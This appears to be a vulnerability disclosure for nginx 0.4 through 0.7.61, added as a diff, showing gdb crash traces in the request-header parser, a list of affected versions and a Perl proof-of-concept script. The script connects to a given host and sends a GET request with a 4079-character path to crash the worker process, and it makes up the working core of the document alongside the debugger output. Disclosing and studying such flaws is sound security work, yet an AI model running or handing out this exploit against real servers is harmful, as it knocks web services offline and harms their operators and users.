@@ -1,0 +1,147 @@
+debian:~# uname -a Linux debian 2.6.18-6-686 #1 SMP Thu Aug 20 21:56:59 UTC
+2009 i686 GNU/Linux
+debian:~# cat /etc/issue
+Debian GNU/Linux 4.0 \n \l
+
+debian:~# dpkg -l|grep nginx
+ii nginx 0.4.13-2+etch2 small, but very powerful and efficient
+debian:~# ps xauwww|grep worker|grep -v grep
+www-data 3577 0.0 0.9 2688 928 ? S 01:50 0:00 nginx: worker process
+debian:~# gdb -p 3577
+GNU gdb 6.4.90-debian
+Copyright (C) 2006 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+
+welcome to change it and/or distribute copies of it under certain
+conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB. Type "show warranty" for details.
+This GDB was configured as "i486-linux-gnu".
+Attaching to process 3577
+Reading symbols from /usr/sbin/nginx...(no debugging symbols found)...done.
+Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
+Reading symbols from /lib/tls/i686/cmov/libcrypt.so.1...(no debugging
+symbols found)...done.
+Loaded symbols for /lib/tls/i686/cmov/libcrypt.so.1
+Reading symbols from /usr/lib/libpcre.so.3...(no debugging symbols
+found)...done.
+Loaded symbols for /usr/lib/libpcre.so.3
+Reading symbols from /usr/lib/libz.so.1...(no debugging symbols
+found)...done.
+Loaded symbols for /usr/lib/libz.so.1
+Reading symbols from /lib/tls/i686/cmov/libc.so.6...
+(no debugging symbols found)...done.
+Loaded symbols for /lib/tls/i686/cmov/libc.so.6
+Reading symbols from /lib/ld-linux.so.2...(no debugging symbols
+found)...done.
+Loaded symbols for /lib/ld-linux.so.2
+Reading symbols from /lib/tls/i686/cmov/libnss_compat.so.2...(no debugging
+symbols found)...done.
+Loaded symbols for /lib/tls/i686/cmov/libnss_compat.so.2
+Reading symbols from /lib/tls/i686/cmov/libnsl.so.1...(no debugging symbols
+found)...done.
+Loaded symbols for /lib/tls/i686/cmov/libnsl.so.1
+Reading symbols from /lib/tls/i686/cmov/libnss_nis.so.2...
+(no debugging symbols found)...done.
+Loaded symbols for /lib/tls/i686/cmov/libnss_nis.so.2
+Reading symbols from /lib/tls/i686/cmov/libnss_files.so.2...(no debugging
+symbols found)...done.
+Loaded symbols for /lib/tls/i686/cmov/libnss_files.so.2
+Failed to read a valid object file image from memory.
+0xb7f06410 in ?? ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08068f23 in ?? ()
+(gdb) bt
+#0 0x08068f23 in ?? ()
+#1 0x080b0540 in ?? ()
+#2 0x080a54e4 in ?? ()
+#3 0x00000000 in ?? ()
+(gdb) i r
+eax 0x6d4 1748
+ecx 0xbff21028 -1074655192
+edx 0x80b1794 134944660
+ebx 0x80b0540 134939968
+esp 0xbff21880 0xbff21880
+ebp 0xbff218d8 0xbff218d8
+esi 0x80b5630 134960688
+edi 0x80b0540 134939968
+eip 0x8068f23 0x8068f23 <__gmon_start__@plt+126827>
+eflags 0x10206 [ PF IF RF ]
+cs 0x73 115
+ss 0x7b 123
+ds 0x7b 123
+es 0x7b 123
+fs 0x0 0
+gs 0x33 51
+(gdb) q
+The program is running. Quit anyway (and detach it)? (y or n) y
+Detaching from program: /usr/sbin/nginx, process 3577
+debian:~#
+
+in nginx error log we can see :
+2009/10/15 01:53:24 [alert] 2477#0: worker process 3577 exited on signal 11
+
+===============================
+
+here is same test on nginx compiled with debug :
+
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+ngx_http_process_request_headers (rev=0x80c95d8) at
+src/http/ngx_http_request.c:793
+793 header.data[header.len++] = '.';
+(gdb) bt
+#0 ngx_http_process_request_headers (rev=0x80c95d8) at
+src/http/ngx_http_request.c:793
+#1 0x08069c63 in ngx_http_process_request_line (rev=0x80c95d8) at
+src/http/ngx_http_request.c:702
+#2 0x080668ff in ngx_http_init_request (rev=0x80c95d8) at
+src/http/ngx_http_request.c:446
+#3 0x0805f67e in ngx_epoll_process_events (cycle=0x80a59e8, timer=60000,
+flags=<value optimized out>)
+at src/event/modules/ngx_epoll_module.c:518
+#4 0x08056712 in ngx_process_events_and_timers (cycle=0x80a59e8) at
+src/event/ngx_event.c:245
+#5 0x0805cebd in ngx_worker_process_cycle (cycle=0x80a59e8, data=0x0) at
+src/os/unix/ngx_process_cycle.c:728
+#6 0x0805b9b1 in ngx_spawn_process (cycle=0x80a59e8, proc=0x805c8a2
+<ngx_worker_process_cycle>, data=0x0,
+name=0x808e46b "worker process", respawn=-2) at
+src/os/unix/ngx_process.c:187
+#7 0x0805c470 in ngx_start_worker_processes (cycle=0x80a59e8, n=1, type=-2)
+at src/os/unix/ngx_process_cycle.c:327
+#8 0x0805d442 in ngx_master_process_cycle (cycle=0x80a59e8) at
+src/os/unix/ngx_process_cycle.c:119
+#9 0x0804ae5b in main (argc=1, argv=0xbfd72ac4) at src/core/nginx.c:332
+(gdb) i r $eip
+eip 0x8068e52 0x8068e52 <ngx_http_process_request_headers+273>
+(gdb)
+
+===============================
+
+tested on versions 0.7.0 <= 0.7.61, 0.6.0 <= 0.6.38, 0.5.0 <= 0.5.37, 0.4.0
+<= 0.4.14
+
+================================
+here is POC:
+
+#!/usr/bin/perl
+use IO::Socket;
+if ($#ARGV != 0) {
+print "Usage: ./nginx.pl <hostname>\n";
+exit;}
+$sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],
+PeerPort => '80',
+Proto => 'tcp');
+$mysize = 4079;
+$mymsg = "o" x $mysize;
+print $sock "GET /$mymsg HTTP/1.1\r\n\r\n";
+
+while(<$sock>) {
+print;
+}
